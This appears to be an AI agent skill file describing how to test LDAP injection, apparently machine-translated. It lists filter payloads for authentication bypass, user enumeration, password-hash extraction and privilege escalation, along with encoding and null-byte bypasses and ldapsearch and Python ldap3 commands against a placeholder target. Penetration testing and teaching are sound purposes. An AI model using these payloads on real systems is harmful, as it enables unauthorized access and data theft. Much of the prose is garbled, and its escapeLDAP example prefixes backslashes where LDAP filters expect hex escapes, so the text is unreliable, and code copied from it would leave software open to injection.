---
name: ldap-injection-testing
description: LDAPProfessional skills and methodology introduced into vulnerability testing
version: 1.0.0
---

# LDAPInject the bug test.

## Overview

This skill provides the detection, use, and protection methods for LDAP injections.

## Vulnerability Principle

The application inputs the user into the LDAP query statement directly, which is not fully validated and filtered, resulting in the attacker being able to modify the query logic.

**Example of hazard code:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAPBasic

### Query Syntax:

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special Characters

**Characters to be converted:**
- `(` `)` - Brackets
- `*` - wildcards
- `\` - Transliteration
- `/` - Path Separator
- `NUL` - Empty Characters

## Test Method

### 1. Identification of LDAP input points

**Common function:**
- User Login
- User Search
- Directory Browsing
- Permission Check

### 2. Basic Detection

**Test special character:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operator:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication Bypass

**Basis bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise circumvention:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information Disclosure

**Enumeration user:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Acquire properties:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logical circumvention**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: Match All Users
```

**Method 2: Comment bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: wildcards**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information Disclosure

**Enumeration for all users:**
```
Search: *)(cn=*
Result: Returns AllcnProperties
```

**Obtain password Hash:**
```
Search: *)(|(cn=*)(userPassword=*
Result: Go back to the user and password Harshi.
```

**Acquire sensitive properties:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: Returns several sensitive properties
```

### Privilege Escalation

**Modified query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: Could be bypassing the permission check.
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode code:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Comment Bypass

**Use of notes:**
```
*)(&(cn=*
*)(|(cn=*
```

### Empty Character Injection

**Use NULL bytes:**
```
*))%00
```

## Using the Tools

### JXplorer

**Graphical LDAP client:**
- Connect LDAP server
- Browse directory structure
- Execute Query Test

### ldapsearch

```bash
# Basic Query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Interception of LDAP search request
2. Modify Query Parameters
3. Observe the response.

### PythonScript

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verification and Reporting

### Verification Steps

1. Confirmable to control LDAP queries
2. Authentication circumvention or disclosure of information
3. Assess the impact (unauthorized access, data disclosure, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Vulnerability location and input parameter
- LDAPQuery construction
- the complete exploitation steps andPoC
- Remediation recommendations (entry validation, parametric queries, etc.)

## Preventive Measures

### Recommended Approach

1. **Input Validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parametric Query**
   ```java
   // UsingLDAP APIParametric function for %1
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // UsingAPIBuild Query
   ```

3. **Allowlist Validation**
   ```java
   // Only specific characters are allowed
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least Privilege**
   - LDAPConnection with Minimum Permission Account
   - Limit Queryable Properties
   - Use access control list

5. **Error Handling**
   - Do not return detailed error information
   - Unified Error Response
   - Log the Errors

## Important Notes

- Perform only in an authorized testing environment
- Note the syntax differences between LDAP servers
- Avoid impact on directories during testing
- Find out the configuration of the target LDAP server